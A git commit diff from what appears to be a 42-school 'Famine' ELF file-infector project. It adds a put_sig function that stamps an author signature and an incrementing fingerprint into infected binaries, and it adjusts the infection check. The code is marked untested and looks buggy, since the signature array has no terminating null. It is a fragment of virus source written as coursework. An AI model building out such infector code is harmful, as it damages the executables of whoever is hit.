8f69765d863ddf00f6d4afc01e0ab9683e959131
Axel Fiodiere <afiodier@student.42.fr>
2019-11-15 17:13:47 +0100

    add fonction put_sig (not tested)

--- src/is_infected.c
+++ src/is_infected.c
@@ -5,7 +5,7 @@ static char	*ft_find_str(const char *haystack, size_t n)
 	unsigned int	i;
 	unsigned int	j;
 	unsigned int	k;
-    const char needle[] = SIGN;
+    const char needle[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
 
 	i = 0;
     write(1,&needle[0],14); 
@@ -27,7 +27,7 @@ static char	*ft_find_str(const char *haystack, size_t n)
 	return (NULL);
 }
 
-bool    is_infected(char *path_file, t_file *file)
+bool    is_infected_general(char *path_file, t_file *file)
 {
     if(open_map(path_file, file))
         return ((file->error = 1) - 1);
@@ -48,26 +48,35 @@ bool	is_infected(t_file *file)
 	// header->e_entry - 62; // start signature
 	while(sig[i])
 	{
-		if (sig[i] !=  *(header->e_entry - SIZE_BEFORE_ENTRY_POINT + i))
+		if (sig[i] !=  *((char *)(header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
 			return(0);
 		i++;
 	}
 	return(1);
 }
 
-bool	put_sig(t_file *file)
+void	put_sig(char *data)
 {
 	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
+	char fingerprint[] = {'0','0','0','0','0','0','0','0'};
 	int i;
 
 	i = 0;
-	header = (Elf64_Ehdr *)file->data;
-	header->e_entry - 8; // fingerprint
-	header->e_entry - 62; // start signature
+	*(long long *)fingerprint = *(long long *)get_eip();
+
 	while(sig[i])
 	{
-		if (sig[i] !=  *(header->e_entry - 62 + i))
-			return(0);
+		data[i] = sig[i]; 
+		i++;
 	}
-	return(1);
+	i = 7;
+	while(i >= 0)
+	{
+		if(fingerprint[i] == 9)
+			fingerprint[i] = 0;
+		else
+			fingerprint[i]++;
+		i--;
+	}
+	*(long long*)&(data[i]) = *(long long *)fingerprint;
 }
